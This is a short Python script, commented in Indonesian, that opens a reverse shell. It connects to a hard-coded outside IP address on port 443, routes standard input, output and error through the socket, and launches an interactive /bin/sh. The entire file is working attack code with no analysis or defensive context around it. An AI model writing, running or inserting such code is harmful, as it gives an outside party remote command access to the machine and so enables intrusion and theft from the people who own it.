import socket
import subprocess
import os

def reverse_shell():
    ip = "202.155.95.145"
    port = 443
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))

    # Redirect stdin, stdout, stderr ke socket
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)

    # Jalankan shell
    subprocess.call(["/bin/sh", "-i"])

if __name__ == "__main__":
    reverse_shell()